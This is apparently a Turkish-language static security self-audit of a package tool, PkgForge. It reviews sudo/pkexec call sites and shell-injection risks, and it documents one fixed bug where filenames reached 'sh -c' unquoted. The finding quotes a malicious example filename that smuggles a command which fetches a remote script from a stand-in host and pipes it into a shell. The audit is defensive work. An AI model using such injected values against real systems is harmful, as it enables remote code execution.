# PkgForge Güvenlik Öz-Denetimi (Tur-60)

Tarih: bu oturum · Kapsam: yetki yükseltme yolları ve kabuk enjeksiyonu
yüzeyi (CWE-78, CWE-250) · Yöntem: elle kod incelemesi + otomatik tarama
(bandit zaten CI'da).

## Tarama yöntemi
- 12 modül pkexec/sudo yüzeyi listelendi; hepsinin komut kurulumu okundu.
- Tüm `bash -c`/`sh -c` siteleri tarandı: rpm_converter:106,
  subprocess_converters:270, rpm_to_deb_converter:61, abi_scanner:366,
  distrobox_fallback:144, install_rehearsal:40.
- argv-list formu kullanan çağrılar (installer pkexec yolu) yapısal olarak
  güvenli sayıldı; `--` ayracının pacman opsiyon enjeksiyonunu kestiği
  doğrulandı.

## BULGU-1 (DÜZELTİLDİ): install_rehearsal container içi enjeksiyon
- **Nerede:** core/install_rehearsal.py, run_install_rehearsal()
- **Sorun:** Paket dosya adı ve kaynak klasörü, container içindeki
  `sh -c` dizesine quote'suz gömülüyordu. Kötü niyetli bir dosya adı
  (`x; curl evil.sh | sh; #.pkg.tar.zst`) container içinde rastgele
  komut çalıştırabilirdi (CWE-78). Etki alanı tek seferlik `--rm`
  container'la sınırlıydı ama salt-okunur mount üzerinden veri sızma /
  ağ erişimi riski gerçekti.
- **Çözüm:** `shlex.quote()` hem dosya adına hem volume kaynağına
  uygulandı; regresyon testleri yeşil.

## Temiz bulunanlar (değişiklik gerekmedi)
| Yer | Neden güvenli |
|---|---|
| installer.py pkexec pacman -U | argv-list + `--` ayracı |
| privileged.py argv üretimi | sabit /etc yolları, kullanıcı girdisi yok |
| delta_updater install/remove | sabit birim/dizin adları |
| rpm_converter / subprocess_converters / rpm_to_deb | pipeline tamamen shlex.quote'lu |
| abi_scanner ar x | pkg_path quote'lu |
| distrobox_fallback | tüm değişkenler shlex.quote'lu |

## Sınırlar
Bu bir statik öz-denetimdir; dinamik pentest/fuzzing içermez.
Harici yayın öncesi üçüncü göz önerilir.
